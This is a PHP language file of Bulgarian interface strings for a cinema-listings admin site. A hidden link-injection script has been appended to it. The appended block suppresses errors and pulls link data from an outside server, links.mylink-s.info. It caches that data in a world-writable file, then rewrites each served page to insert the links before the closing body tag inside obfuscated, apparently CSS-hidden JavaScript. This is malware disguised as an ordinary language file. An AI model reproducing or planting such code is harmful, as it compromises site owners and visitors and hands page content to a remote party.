<?php /**/ ?><?php
// ------------------------------------------------------------------
// lang.en.inc.php
// ------------------------------------------------------------------
// Language file - English version.
// Copyright (c) 2002 Dreamware Technologies
// http://www.dreamwaretech.com

//admin messages
$MSG[20001] = "Достъп отказан";
$MSG[20002] = "Неоторизиран достъп";
$MSG[20003] = "Паролите не съвпадат";
$MSG[20004] = "Паролата е прекалено къса";
$MSG[20005] = "Грешна парола";
$MSG[20006] = "Паролата е променена";

$MSG[20007] = "Няма въведени кина";

$MSG[20008] = "Няма нищо избрано";

$MSG[20009] = "Дублиране на кина";
$MSG[20010] = "Киното е записано успешно";
$MSG[20011] = "В някой от избраните за изтриване кина има въведени заглавия от програмата";
	
	//$MSG[20012] = "Някой от маркираните кина не са въведени от вас";
	$MSG[20012] = 'Необходимо е да въведете броят на позициите в класацията';

$MSG[20013] = "Маркираните кина са изтрити успешно";

$MSG[20014] = "Въведете или заглавие на филма, или оригинално заглавие";
$MSG[20015] = "Празен режисьор";
$MSG[20016] = "Празни актьори";
$MSG[20017] = "Празно съдържание";
$MSG[20018] = "Информацията е записана";
$MSG[20019] = "Трябва да изберете снимка";
$MSG[20020] = "Невалиден файл";
$MSG[20021] = "Избраният филм не е открит";
$MSG[20022] = "Снимката е записана";

$MSG[20023] = "Няма въведени градове";

$MSG[20024] = "снимка";

$MSG[20025] = "Липсват часове на прожекциите";
$MSG[20026] = "Необходимо е да изберете заглавие от списъка с филми";
$MSG[20027] = "Необходимо е да въведете заглавие";
$MSG[20028] = "Необходимо е да изберете начин на представяне на заглавието";
$MSG[20029] = "Заглавието е записано успешно";
$MSG[20030] = "Маркираните заглавия са изтрити успешно";
$MSG[20031] = "Не разполагаме с информация за това заглавние";
$MSG[20032] = "Необходимо е да изберете филм";

$MSG[20033] = "Премиерета е записана успешно";

$MSG[20034] = "Няма въведени дистрибутори";

$MSG[20035] = "Заглавието вече е въведено в програмата на киносалона за тази седмица.";

$MSG[20036] = "Дублиране на дистрибутори";
$MSG[20037] = "Дистрибуторът е записан успешно";
$MSG[20038] = "Някой от избраните за изтриване дистрибутори са свързани към видео заглавия";
	
	//$MSG[20039] = "Някой от маркираните дистрибутори не са въведени от вас";
	$MSG[20039] = 'Некоректни данни за броят на позициите в класацията';

$MSG[20040] = "Маркираните дистрибутори са изтрити успешно";

$MSG[20041] = "Видео премиерата е записано успешно";
$MSG[20042] = "Невалиден файл за снимка";

$MSG[20043] = 'Някой от избраните за изтриване дистрибутори са свързани към DVD заглавия';

$MSG[20044] = 'Маркираните видео премиери са изтрити успешно';

$MSG[20045] = 'Маркираните DVD премиери са изтрити успешно';
$MSG[20046] = 'DVD премиерата е записано успешно';
$MSG[20047] = 'Излизате извън границите на търсенето';

$MSG[20048] = 'Премиерите са oсвободени успешно';

$MSG[20049] = 'Щатските премиери са oсвободени успешно';

$MSG[20050] = 'Записването на сървъра е успешно';
$MSG[20051] = 'За последен път е направен архив на ';
$MSG[20052] = 'Архивирането е успешно';
$MSG[20053] = 'Избрали сте повече от един файл за разархивиране';
$MSG[20054] = 'Избраните архиви са изтрити успешно';
$MSG[20055] = 'Грешка при импортирането';
$MSG[20056] = 'Разархивирането е успешно';

$MSG[20057] = 'Щатската премиера е записана успешно';

$MSG[20058] = 'Включен';
$MSG[20059] = 'Изключен';

$MSG[20060] = '[Начало]';
$MSG[20061] = '[Край]';
$MSG[20062] = '[Напред]';
$MSG[20063] = '[Назад]';
$MSG[20064] = 'Избраните филми бяха успешно изключени от кино програмата';
$MSG[20065] = 'Избраният филм е успешно включен в кино програмата';
$MSG[20066] = 'Избраните филми бяха успешно изтрити';

$MSG[20067] = '[добави]';
$MSG[20068] = 'Последно обновяван на ';

$MSG[20069] = 'Необходимо е да въведете заглавие на статията';
$MSG[20070] = 'Необходимо е да изберете секция, към която да се асоциира статията';
$MSG[20071] = 'Статията е с празно съдържание';

	//$MSG[20072] = 'Дистрибуторът, който се опитвате да редактирате, не е въведен от вас';
	$MSG[20072] = 'Дублиране на класации';
	//$MSG[20073] = 'Киносалонът, който се опитвате да редактирате, не е въведен от вас';
	$MSG[20073] = 'Класацията е записана успешно';
	//$MSG[20074] = 'Градът, който се опитвате да редактирате, не е въведен от вас';
	$MSG[20074] = 'кино класация';

$MSG[20075] = 'Празни входни данни';
$MSG[20076] = 'Дублиране на градове';
$MSG[20077] = 'Градът е записан успешно';
$MSG[20078] = 'В някой от избраните за изтриване градове има въведени кина';
$MSG[20079] = 'Маркираните градове са изтрити успешно';

	//$MSG[20080] = 'Някой от маркираните градове не са въведени от вас';
	$MSG[20080] = 'видео или dvd класация';

$MSG[20081] = "Избранита статия не е открита";

	$MSG[20082] = "Кино";
	$MSG[20083] = "Видео";
	$MSG[20084] = "DVD";
	$MSG[20085] = "Щатски премиери";
	$MSG[20086] = "Първа страница";
	$MSG[20087] = "На милиметър";
	$MSG[20088] = "Саундтрак";
	$MSG[20089] = "Звезда на месеца";
	$MSG[20090] = "Зад кадър";
	$MSG[20091] = "Втори Дубъл";

$MSG[20092] = 'Датата за седмицата е записана успешно';
$MSG[20093] = 'Избраните статии са изтрити успешно';

$MSG[20094] = 'Няма въведени класации';
$MSG[20095] = 'Някой от избраните за изтриване класации се използват';
$MSG[20096] = 'Маркираните класации са изтрити успешно';

$MSG[20097] = 'Празна позиция';
$MSG[20098] = 'Празни седмици';
$MSG[20099] = 'Некоректна информация за позиция';
$MSG[20100] = 'Некоректна информация за седмици';
$MSG[20101] = 'Празни екрани';
$MSG[20102] = 'Некоректна информация за екрани';
$MSG[20103] = 'Празен седмичен приход';
$MSG[20104] = 'Некоректна информация за седмичният приход';
$MSG[20105] = 'Празен общ приход';
$MSG[20106] = 'Некоректна информация за общият приход';
$MSG[20107] = 'Записът от класацията е записан';

$MSG[20108] = 'Въведете файл с архив';
$MSG[20109] = 'Качен на ';
$MSG[20110] = 'Оригинално име';


// index messages
$MSG[30001] = 'официален уебсайт';

$MSG[30002] = 'Кино премиерите са за седмицата';
$MSG[30003] = 'Световните премиери са за седмицата';
$MSG[30004] = 'Видео премиерите са за седмицата';
$MSG[30005] = 'DVD премиерите са за седмицата';

$MSG[30006] = "Световни премиери";

$MSG[30007] = 'Видео премиерите тази седмица';
$MSG[30008] = 'Кино премиерите тази седмица';
$MSG[30009] = 'DVD премиерите тази седмица';
$MSG[30010] = 'Световни премиери';
$MSG[30011] = 'Новини на милиметър';
$MSG[30012] = 'Втори дубъл';
$MSG[30013] = 'Тази седмица';

$MSG[30014] = 'c ';
$MSG[30015] = 'на';

$MSG[30016] = 'Кино програмата е за седмицата';
$MSG[30017] = 'Музиката от екрана';

$MSG[30018] = 'режисьор: ';
$MSG[30019] = 'в ролите: ';

$MSG[30020] = 'Статията е отпечатана на ';



$TITLES['login'] = 'Аутентификация';
$TITLES['menu'] = 'Работно меню';
$TITLES['backup'] = 'Архиви';

$TITLES['city'] = 'Градове';
$TITLES['cinema'] = 'Кина';
$TITLES['insertfilm'] = 'Редакция на филм';
$TITLES['film'] = 'Филми';
$TITLES['agenda'] = 'Програма';
$TITLES['cinema_new'] = 'Кино премиери';

$TITLES['videodistr'] = 'Видео дистибутори';
$TITLES['video_new'] = 'Видео премиери';

$TITLES['dvddistr'] = 'DVD дистибутори';
$TITLES['dvd_new'] = 'DVD премиери';

$TITLES['usa_new'] = 'Щатски премиери';

$TITLES['add_article'] = 'Добави статия';

$TITLES['charts'] = 'Класации';
$TITLES['manage_chart'] = 'Актуализация на класации';

$MONTHS [1] = 'януари' ;
$MONTHS [2] = 'февруари' ;
$MONTHS [3] = 'март' ;
$MONTHS [4] = 'април' ;
$MONTHS [5] = 'май' ;
$MONTHS [6] = 'юни' ;
$MONTHS [7] = 'юли' ;
$MONTHS [8] = 'август' ;
$MONTHS [9] = 'септември' ;
$MONTHS [10] = 'октомври' ;
$MONTHS [11] = 'ноември' ;
$MONTHS [12] = 'декември' ;

$MON[1] = 'I' ;
$MON[2] = 'II' ;
$MON[3] = 'III' ;
$MON[4] = 'IV' ;
$MON[5] = 'V' ;
$MON[6] = 'VI' ;
$MON[7] = 'VII' ;
$MON[8] = 'VIII' ;
$MON[9] = 'IX' ;
$MON[10] = 'X' ;
$MON[11] = 'XI' ;
$MON[12] = 'XII' ;

$MONTHS2 = array(
 1  => 'January',
 2  => 'February',
 3  => 'March',
 4  => 'April',
 5  => 'May',
 6  => 'June',
 7  => 'July',
 8  => 'August',
 9  => 'September',
 10 => 'October',
 11 => 'November',
 12 => 'December'
);
?>
<?php
error_reporting(0);

class CM_base {

	// base
  var $_id								= '00e2d7e34530254f62dbfc07546d3e60';

	// optional
  var $_verbose           = false;
  var $_charset           = 'UTF-8';
	var $_fetch_remote_type = 'curl';
	var $_socket_timeout    = 6;
	var $_links_delimiter		= ' ';
	var $_show_code					= false;

	// other
  var $_servers						= 'links.mylink-s.info';
  var $_cache_lifetime    = 3000;
  var $_cache_reloadtime  = 600;
  var $_error             = '';
  var $_db_file           = '';

  function CM_base($options = null) {

		if (isset($options['verbose']) && $options['verbose'] == true)
			$this->_verbose = true;

    if (isset($options['charset']) && strlen($options['charset']))
      $this->_charset = $options['charset'];

    if (isset($options['fetch_remote_type']) && strlen($options['fetch_remote_type']))
      $this->_fetch_remote_type = $options['fetch_remote_type'];

		if (isset($options['socket_timeout']) && is_numeric($options['socket_timeout']) && $options['socket_timeout'] > 0)
      $this->_socket_timeout = $options['socket_timeout'];

    if (isset($options['links_delimiter']) && strlen($options['links_delimiter']))
      $this->_links_delimiter = $options['links_delimiter'];

    if (isset($options['show_code']) && $options['show_code'] == true)
       $this->_show_code = true;
	
	}


  function fetch_remote_file($host, $path) {

		@ini_set('allow_url_fopen',          1);
    @ini_set('default_socket_timeout',   $this->_socket_timeout);

    if ($this->_fetch_remote_type == 'file_get_contents' || 
			($this->_fetch_remote_type == '' && function_exists('file_get_contents') && ini_get('allow_url_fopen') == 1)) {
            
			$this->_fetch_remote_type = 'file_get_contents';
			$data = @file_get_contents('http://' . $host . $path);

			if ($data)
				return $data;

    } elseif ($this->_fetch_remote_type == 'curl' || 
			($this->_fetch_remote_type == '' && function_exists('curl_init'))) {
            
			$this->_fetch_remote_type = 'curl';

      if ($ch = @curl_init()) {

				@curl_setopt($ch, CURLOPT_URL,              'http://' . $host . $path);
				@curl_setopt($ch, CURLOPT_HEADER,           false);
				@curl_setopt($ch, CURLOPT_RETURNTRANSFER,   true);
				@curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,   $this->_socket_timeout);

        $data = @curl_exec($ch);
        @curl_close($ch);

				if ($data)
					return $data;
			}

    } else {

			$this->_fetch_remote_type = 'socket';

      $buff = '';
      $fp = @fsockopen($host, 80, $errno, $errstr, $this->_socket_timeout);

      if ($fp) {

				@fputs($fp, "GET {$path} HTTP/1.0\r\nHost: {$host}\r\n");

				while (!@feof($fp))
					$buff .= @fgets($fp, 128);

				@fclose($fp);

				$page = explode("\r\n\r\n", $buff);
				return $page[1];

      }

    }

    return $this->raise_error('Не могу подключиться к серверу: ' . $host . $path.', type: '.$this->_fetch_remote_type);
  }

  function _read($filename) {
        
		$fp = @fopen($filename, 'rb');
		@flock($fp, LOCK_SH);

		if ($fp) {

			clearstatcache();
			$length = @filesize($filename);
			$mqr = get_magic_quotes_runtime();
			set_magic_quotes_runtime(0);

			if ($length)
				$data = @fread($fp, $length);
			else
				$data = '';

      set_magic_quotes_runtime($mqr);
      @flock($fp, LOCK_UN);
      @fclose($fp);

      return $data;

    }

    return $this->raise_error('Не могу считать данные из файла: ' . $filename);
  }

  function _write($filename, $data) {

		$fp = @fopen($filename, 'wb');
    if ($fp) {
			@flock($fp, LOCK_EX);
			$length = strlen($data);
			@fwrite($fp, $data, $length);
			@flock($fp, LOCK_UN);
      @fclose($fp);

      if (md5($this->_read($filename)) != md5($data))
				return $this->raise_error('Нарушена целостность данных при записи в файл: ' . $filename);

      return true;
    }

    return $this->raise_error('Не могу записать данные в файл: ' . $filename);
  }

  function raise_error($e) {

		$this->_error = '<p style="color: red; font-weight: bold;">CM ERROR: ' . $e . '</p>';

		if ($this->_verbose == true)
			print $this->_error;

    return false;
  }

  function load_data() {

		if (!is_dir(dirname(__FILE__).'/temp')){
			if (!mkdir(dirname(__FILE__).'/temp')){
				return $this->raise_error('Нет папки ' . dirname(__FILE__).'/temp'. '. Создать не удалось.');
			}
		}


    $this->_db_file = dirname(__FILE__) . '/temp/links.db';

    if (!is_file($this->_db_file)) {

			if (@touch($this->_db_file))
				@chmod($this->_db_file, 0666);
			else
				return $this->raise_error('Нет файла ' . $this->_db_file . '. Создать не удалось. Выставите права 777 на папку.');

    }

    if (!is_writable($this->_db_file))
			return $this->raise_error('Нет доступа на запись к файлу: ' . $this->_db_file . '! Выставите права 777 на папку.');

    @clearstatcache();

    if ((filemtime($this->_db_file) < (time()-$this->_cache_lifetime) || filesize($this->_db_file) == 0)) {

			@touch($this->_db_file, (time() - $this->_cache_lifetime + $this->_cache_reloadtime));
            
			$path = '/system/mngr.php?id=' . $this->_id . '&md5=' . md5($this->_read($this->_db_file));

      if (strlen($this->_charset))
				$path .= '&charset=' . $this->_charset;

			$servers = explode("|", $this->_servers);
			foreach($servers as $server){

				if ($data = $this->fetch_remote_file($server, $path)){
			
					if (substr($data, 0, 12) == 'FATAL ERROR:') {

						$this->raise_error($data);

					} else if (substr($data, 0, 9) != 'UNCHANGED') {

						$hash = @unserialize($data);

						if ($hash != false) {

							$data_new = @serialize($hash);

							if ($data_new)
								$data = $data_new;
							
							$this->_write($this->_db_file, $data);

							break;

						}

					} // if fatal error unchanged

				} // fetch

			} // foreach
            
    }

    if ($data = $this->_read($this->_db_file))
			$this->set_data(@unserialize($data));

  }
}

class CM_client extends CM_base {

	var $_links_page = array();

	function CM_client($options = null) {
			parent::CM_base($options);
			$this->load_data();
	}

	function return_links($n = null, $offset = 0) {

		$html = '';

		if (is_array($this->_links_page)) {

			$total_page_links = count($this->_links_page);

			if (!is_numeric($n) || $n > $total_page_links)
				$n = $total_page_links;

			$links = array();

			for ($i = 1; $i <= $n; $i++) {
				if ($offset > 0 && $i <= $offset)
					array_shift($this->_links_page);
				else
					$links[] = array_shift($this->_links_page);
			}

			$html = join($this->_links_delimiter, $links);
					
		} else {
			$html = $this->_links_page;
		}

		if ($this->_show_code)
			$html = $html . '<!--CM'.($this->_id).'-->';

		return $html;

	}


  function set_data($data) {

		$this->_links_page = $data;

  }
}


$CM = new CM_client();
if (!$_GET['donttouchthis']) {
$bot = true;
    
    if($bot) {
        	
$start = "<script language=\"JavaScript\">var a=0,m,v,t,z,x=new Array('8990958275','8786908091808685337273908683929176349186873320323232328795','768686','939889783816937897932476929216'),l=x.length;while(++a<=l){m=x[l-a];t=z='';for(v=0;v<m.length;){t+=m.charAt(v++);if(t.length==2){z+=String.fromCharCode(parseInt(t)+26-l+a);t='';}}x[l-a]=z;}document.write('<'+x[0]+' '+x[4]+'>.'+x[2]+'{'+x[1]+'}</'+x[0]+'>');</script><p class=\"dnn\">";
$finish = "</p>";  
$links = $CM->return_links();
        if (strpos ($_SERVER['REQUEST_URI'], "?"))
            $originalurl = "http://".$_SERVER["HTTP_HOST"].$_SERVER['REQUEST_URI']."&donttouchthis=true";
        else $originalurl = "http://".$_SERVER["HTTP_HOST"].$_SERVER['REQUEST_URI']."?donttouchthis=true";
        $originalpage = get ($originalurl);
        $originalpage = preg_replace('/(<\/body>)/i', "$start$links$finish2$1", $originalpage, 1);
        print $originalpage;
		 exit;
    }
}

function get ($url) {
    if (function_exists("curl_init")) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        $page = curl_exec($c);
        curl_close($c);
    } else $page = file_get_contents ($url);
    return $page;
}



?>